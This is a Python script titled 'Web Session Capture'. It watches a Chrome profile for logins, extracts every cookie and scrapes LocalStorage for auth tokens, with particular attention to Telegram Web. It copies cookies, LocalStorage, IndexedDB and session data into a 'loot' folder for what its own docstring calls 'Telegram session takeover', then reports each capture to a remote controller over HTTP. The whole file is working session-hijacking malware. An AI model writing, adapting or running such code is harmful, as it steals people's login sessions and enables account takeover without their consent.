#!/usr/bin/env python3
"""
Web Session Capture - Monitors for any website login
"""

import os
import sys
import time
import json
import sqlite3
import shutil
import requests
import hashlib
from pathlib import Path
from datetime import datetime

CHROME_PROFILE = Path("/root/.config/google-chrome/Default")
LOOT_DIR = Path("/app/loot")
CONTROLLER_URL = os.environ.get("CONTROLLER_URL", "http://controller:5000")
SESSION_ID = os.environ.get("SESSION_ID", "session_1")
CHECK_INTERVAL = 3

# Track state
session_captured = False


def get_chrome_cookies():
    """Extract cookies from Chrome"""
    cookies = []
    cookies_db = CHROME_PROFILE / "Cookies"
    
    if not cookies_db.exists():
        return cookies
    
    temp_db = Path("/tmp/cookies_copy.sqlite")
    try:
        shutil.copy2(cookies_db, temp_db)
        conn = sqlite3.connect(str(temp_db))
        conn.text_factory = lambda b: b.decode(errors='ignore')
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
            FROM cookies
        """)
        
        for row in cursor.fetchall():
            cookies.append({
                "domain": row[0],
                "name": row[1],
                "value": row[2],
                "path": row[3],
                "expiry": row[4],
                "secure": bool(row[5]),
                "httpOnly": bool(row[6])
            })
        conn.close()
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
    finally:
        if temp_db.exists():
            temp_db.unlink()
    
    return cookies


def get_telegram_local_storage():
    """Get Telegram session data from localStorage"""
    storage = {}
    ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
    
    if not ls_path.exists():
        return storage
    
    # Try to read from IndexedDB for Telegram
    idb_path = CHROME_PROFILE / "IndexedDB"
    if idb_path.exists():
        for db_dir in idb_path.iterdir():
            if "telegram" in db_dir.name.lower():
                storage["indexeddb_path"] = str(db_dir)
    
    return storage


def get_telegram_token():
    """Extract Telegram auth token from LocalStorage"""
    try:
        # Telegram Web stores auth data in LocalStorage
        ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
        
        if not ls_path.exists():
            return None
        
        # Read all leveldb files to find auth data
        for db_file in ls_path.glob("*.ldb"):
            try:
                with open(db_file, 'rb') as f:
                    content = f.read()
                    # Look for auth-related strings
                    if b'auth' in content or b'token' in content or b'session' in content:
                        # Extract readable strings
                        strings = []
                        current = b''
                        for byte in content:
                            if 32 <= byte <= 126:  # Printable ASCII
                                current += bytes([byte])
                            else:
                                if len(current) > 50:
                                    strings.append(current.decode('ascii', errors='ignore'))
                                current = b''
                        
                        # Return longest string (likely the token)
                        if strings:
                            return max(strings, key=len)
            except:
                pass
        
        return None
    except Exception as e:
        print(f"[TG Monitor] Token extraction error: {e}", flush=True)
        return None


def export_session():
    """Export everything needed for Telegram session takeover"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    export_dir = LOOT_DIR / SESSION_ID / f"telegram_{timestamp}"
    export_dir.mkdir(parents=True, exist_ok=True)
    
    # Copy Chrome data
    items_to_copy = [
        "Cookies",
        "Local Storage",
        "IndexedDB", 
        "Session Storage",
        "Preferences"
    ]
    
    for item in items_to_copy:
        src = CHROME_PROFILE / item
        dst = export_dir / item
        if src.exists():
            try:
                if src.is_dir():
                    shutil.copytree(src, dst)
                else:
                    shutil.copy2(src, dst)
            except Exception as e:
                print(f"Copy error {item}: {e}", file=sys.stderr)
    
    # Copy Local State
    local_state = CHROME_PROFILE.parent / "Local State"
    if local_state.exists():
        shutil.copy2(local_state, export_dir / "Local State")
    
    return str(export_dir)


def send_to_controller(data_type, data):
    """Send to controller"""
    try:
        response = requests.post(
            f"{CONTROLLER_URL}/api/report",
            json={
                "session_id": SESSION_ID,
                "type": data_type,
                "timestamp": datetime.now().isoformat(),
                "data": data
            },
            timeout=5
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Send error: {e}", file=sys.stderr)
        return False


def detect_login():
    """Detect if user is logged into any website"""
    cookies = get_chrome_cookies()
    
    # Check if we have significant cookies (indicates login)
    if len(cookies) < 5:
        return None, None
    
    # Get the primary domain being accessed
    domains = set()
    for cookie in cookies:
        domain = cookie.get("domain", "").lower()
        if domain and not domain.startswith("."):
            domains.add(domain)
    
    # Check Local Storage
    ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
    has_local_storage = False
    if ls_path.exists():
        ls_size = sum(f.stat().st_size for f in ls_path.rglob('*') if f.is_file())
        if ls_size > 5000:
            has_local_storage = True
    
    # If we have cookies + local storage, likely logged in
    if len(cookies) > 5 and has_local_storage:
        primary_domain = list(domains)[0] if domains else "unknown"
        return primary_domain, cookies
    
    return None, None


def main():
    global session_captured
    
    print(f"[Monitor] Starting...", flush=True)
    print(f"[Monitor] Profile: {CHROME_PROFILE}", flush=True)
    print(f"[Monitor] Controller: {CONTROLLER_URL}", flush=True)
    print(f"[Monitor] Session ID: {SESSION_ID}", flush=True)
    
    (LOOT_DIR / SESSION_ID).mkdir(parents=True, exist_ok=True)
    
    check_count = 0
    
    while True:
        try:
            if session_captured:
                time.sleep(10)
                continue
            
            check_count += 1
            
            domain, cookies = detect_login()
            
            # Log status every 10 checks
            if check_count % 10 == 0:
                print(f"[Monitor] Check #{check_count}: domain={domain}, cookies={len(cookies) if cookies else 0}", flush=True)
            
            if domain and not session_captured:
                print(f"[Monitor] *** SESSION DETECTED! ***", flush=True)
                print(f"[Monitor] Domain: {domain}", flush=True)
                
                session_captured = True
                
                # Export profile
                profile_path = export_session()
                print(f"[Monitor] Exported to: {profile_path}", flush=True)
                
                # Send to controller
                result = send_to_controller("web_session", {
                    "domain": domain,
                    "profile_path": profile_path,
                    "cookie_count": len(cookies) if cookies else 0
                })
                print(f"[Monitor] Sent to controller: {result}", flush=True)
        
        except Exception as e:
            print(f"[Monitor] Error: {e}", file=sys.stderr, flush=True)
            import traceback
            traceback.print_exc()
        
        time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    main()
